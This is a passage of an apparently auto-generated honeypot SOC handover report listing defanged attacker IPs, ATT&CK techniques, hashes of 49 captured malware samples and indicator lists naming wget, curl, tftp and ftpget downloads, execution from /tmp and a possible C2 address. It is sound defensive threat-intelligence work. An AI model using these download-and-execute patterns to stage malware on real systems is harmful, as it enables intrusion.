| `45.156.128[.]59` | **2** | 2026-08-03 08:50 | 2026-08-03 08:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-08-03 06:55 | 2026-08-03 07:12 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-08-03 09:17 | 2026-08-03 09:45 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-03 10:20 | 2026-08-03 10:21 | 10s | 0 | `T1592` | 🟢 LOW |
| `113.31.182[.]32` | 1 | 2026-08-03 08:23 | 2026-08-03 08:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.33.241[.]75` | 1 | 2026-08-03 08:47 | 2026-08-03 08:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.250.19[.]91` | 1 | 2026-08-03 10:26 | 2026-08-03 10:26 | 6s | 0 | `T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-08-03 10:00 | 2026-08-03 10:00 | 7s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-08-03 09:07 | 2026-08-03 09:07 | 15s | 0 | `T1592` | 🟢 LOW |
| `155.4.209[.]51` | 1 | 2026-08-03 08:15 | 2026-08-03 08:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-08-03 09:37 | 2026-08-03 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.142.72[.]194` | 1 | 2026-08-03 09:14 | 2026-08-03 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.66.197[.]199` | 1 | 2026-08-03 10:24 | 2026-08-03 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.59.235[.]170` | 1 | 2026-08-03 07:05 | 2026-08-03 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.180.171[.]157` | 1 | 2026-08-03 07:30 | 2026-08-03 07:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `221.213.129[.]46` | 1 | 2026-08-03 09:20 | 2026-08-03 09:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.109.205[.]160` | 1 | 2026-08-03 07:00 | 2026-08-03 07:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-03 07:08 | 2026-08-03 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-08-03 10:07 | 2026-08-03 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]57` | 1 | 2026-08-03 08:50 | 2026-08-03 08:51 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]58` | 1 | 2026-08-03 08:51 | 2026-08-03 08:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-03 07:36 | 2026-08-03 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-08-03 07:42 | 2026-08-03 07:42 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-03 08:36 | 2026-08-03 08:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `47.120.30[.]67` | 1 | 2026-08-03 10:10 | 2026-08-03 10:12 | 94s | 0 | `T1592` | 🟢 LOW |
| `47.242.111[.]161` | 1 | 2026-08-03 08:42 | 2026-08-03 08:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]24` | 1 | 2026-08-03 10:17 | 2026-08-03 10:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]131` | 1 | 2026-08-03 09:47 | 2026-08-03 09:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | 1 | 2026-08-03 07:55 | 2026-08-03 07:55 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-08-03 10:38 | 2026-08-03 10:38 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-03 09:37 | 2026-08-03 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-03 07:57 | 2026-08-03 07:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.66.83[.]43` | 1 | 2026-08-03 07:50 | 2026-08-03 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-03 06:58 | 2026-08-03 07:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.226.181[.]38` | 1 | 2026-08-03 07:35 | 2026-08-03 07:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `86.102.111[.]211` | 1 | 2026-08-03 09:00 | 2026-08-03 09:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-08-03 09:41 | 2026-08-03 09:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.237.111[.]75` | 1 | 2026-08-03 08:11 | 2026-08-03 08:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.46.143[.]40` | 1 | 2026-08-03 09:14 | 2026-08-03 09:15 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `47.120.30[.]67` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 11 |
| `95.87.248[.]223` | BG | Vivacom Bulgaria EAD | **100** ⚠️ | 50 |
| `86.102.111[.]211` | RU | PJSC Rostelecom | **100** ⚠️ | 2 |
| `194.165.16[.]167` | PL | Flyservers S.A. | **100** ⚠️ | 50 |
| `45.156.128[.]59` | NL | INAP-AMS-1 | **100** ⚠️ | 50 |
| `132.148.30[.]167` | US | GoDaddy.com, LLC | **100** ⚠️ | 23 |
| `45.156.128[.]56` | NL | INAP-AMS-1 | **100** ⚠️ | 50 |
| `172.104.210[.]105` | US | Linode | **100** ⚠️ | 50 |
| `200.159.14[.]187` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 143 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 120 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 63 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 61 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 61 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 248 cases |
| Tool 34  | Credential Extractor        | ✅ 150 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 122 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (13.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 68 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 120 priority case(s) shown individually · 52 recon entry/entries in table (16 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-03T11:31:08Z_
